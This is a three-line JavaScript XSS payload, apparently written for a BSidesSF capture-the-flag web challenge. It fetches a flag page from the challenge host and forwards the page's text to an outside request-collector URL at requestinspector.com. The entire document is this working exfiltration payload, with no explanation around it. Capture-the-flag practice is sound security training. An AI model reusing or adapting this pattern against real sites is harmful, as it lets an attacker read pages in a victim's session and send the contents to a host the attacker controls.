fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag')
  .then(r => r.text())
  .then(flag => fetch('https://01km6qv1b7hc61p24fcxe2te0800-91e526c86e8930efdbd1.requestinspector.com/?flag=' + encodeURIComponent(flag)));
